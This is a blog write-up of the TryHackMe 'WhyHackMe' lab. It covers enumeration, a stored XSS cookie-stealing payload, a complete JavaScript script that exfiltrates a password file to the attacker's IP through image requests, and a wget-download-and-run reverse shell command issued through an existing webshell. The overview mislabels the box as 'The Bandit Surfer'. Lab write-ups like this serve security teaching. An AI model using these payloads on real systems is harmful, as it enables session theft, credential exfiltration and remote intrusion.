---
title: "TryHackMe | WhyHackMe"
layout: post
date: 2024-01-11 16:00
tag: 
- TryHackMe
- Pentesting
- XSS
- Linux
- IPtables
- Wireshark
- Data Exfiltration
image: https://tryhackme-images.s3.amazonaws.com/room-icons/18c9bce170d8f6e971864d736c070c4c.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

The Bandit Surfer is a medium TryHackMe linux machine which is described as a combo of compromising and analysis for security enthusiasts.

---

# Nmap

```bash
nmap -A -T4 10.10.179.237
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 13:20 +01
Nmap scan report for 10.10.179.237
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's start by enumerating the FTP port, we see a text file "update.txt" which contains a hint about the existence of */dir/pass.txt* endpoint which is only accessible by local users :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111132233.png>)

# Gobuster

```bash
gobuster dir -u http://10.10.179.237 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.179.237
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.179.237/assets/]
/cgi-bin/             (Status: 403) [Size: 278]
/dir                  (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 563]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Checking the web page at port 80, it contains a link to *blog.php* :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111132502.png>)

In the blog we see that we can add a comment but we must be logged in first :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111132518.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111132528.png>)

So I created a test user in *register.php* :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111134037.png>)

And logged in *login.php* :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111134105.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111134133.png>)

If we recall the endpoint found before in the FTP server, we can confirm that we're not authorized to access it :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111132920.png>)

I thought about testing for XSS, maybe I can craft some user cookie and use it to login :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111134804.png>)

After adding a comment as our user which name is an XSS payload, we can see that the website is vulnerable to reflected XSS :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111134856.png>)

The after a lot of research, I tried to steal the user's cookie using XSS, first I used the bellow payload as a name for a new user :

```js
<script>fetch("http://10.9.1.117:80",{method: "POST", body: document.cookie});</script>
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111140508.png>)

We can see that we get something in our listener :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111140940.png>)

Then using the bellow blogs, and recalling the found endpoint, I was able to exfiltrate the data inside the file :

[https://github.com/hoodoer/XSS-Data-Exfil](https://github.com/hoodoer/XSS-Data-Exfil)

[https://trustedsec.com/blog/simple-data-exfiltration-through-xss](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111141249.png>)

```js
<script src="http://10.9.1.117/exfilPayload.js"></script>
```

I got the data in the format of B64(jack:jack_password) :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111142626.png>)

That's the modified script for data exfiltration :

```js
// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload
function read_body(xhr) 
{ 
	var data;
	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}
function stealData()
{
	var uri = "/dir/pass.txt";
	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);
	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);
			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;
			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);
				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));
				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};
				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://10.9.1.117/exfil/" + i + "/" + exfilChunk + ".jpg";
			}
			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};
			downloadImage.src = "http://10.9.1.117/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}

stealData();
```

And using **Cyberchef** we can get jack's credentials that we can use to login via SSH :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111142818.png>)

# User flag

And we are in as Jack user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111142933.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111143017.png>)

# PE

We see that our user is able to run iptables command as root!

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111143159.png>)

In the */opt* directory we see two files, "urgent.txt" which gives us a hint about the */usr/lib/cgi-bin* and the "capture.pcap" which holds packets captured during the hack :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111144223.png>)

We can see that the */usr/lib/cgi-bin* is owned by root and belongs to *h4ck3d* group :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111144337.png>)

Let's list the defined rules in iptables, we see that the traffic from/to the 41312 port is dropped :

```bash
sudo /usr/sbin/iptables -L
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111144437.png>)

Now I'll analyze the pcap file :

```bash
scp jack@10.10.175.244:/opt/capture.pcap .
```

We can see the traffic going and outgoing to the port used by the attacker (41312) : 

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111145423.png>)

Before updating the iptables rules we see that the port is filtered :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111145819.png>)

```bash
sudo iptables -A INPUT -p tcp --dport 41312 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```

But after updating our iptables we see that port is open now, and holds the apache web server :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111145840.png>)

We cannot see the HTTP traffic in Wireshark since it's TLS encrypted, we need the .key file to decrypt it :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111150055.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111150249.png>)

After finding the "apache.key" file and importing it to Wireshark, we can now see the HTTP traffic :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111150311.png>)

Seeing the request used, we can do the same and get a reverse shell since there is already a webshell :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111152223.png>)

We can successfully execute commands on the server :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111150518.png>)

Now let's get a reverse shell :

```bash
cd /tmp;wget 10.9.1.117/shell.sh;chmod +x shell.sh;bash shell.sh
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111151357.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111151440.png>)

I am in as www data user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111151113.png>)

I can privesc easily by using the `sudo su` command :

![Alt text](<../../../assets/images/THMPics/Pasted image 20240111151254.png>)


<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>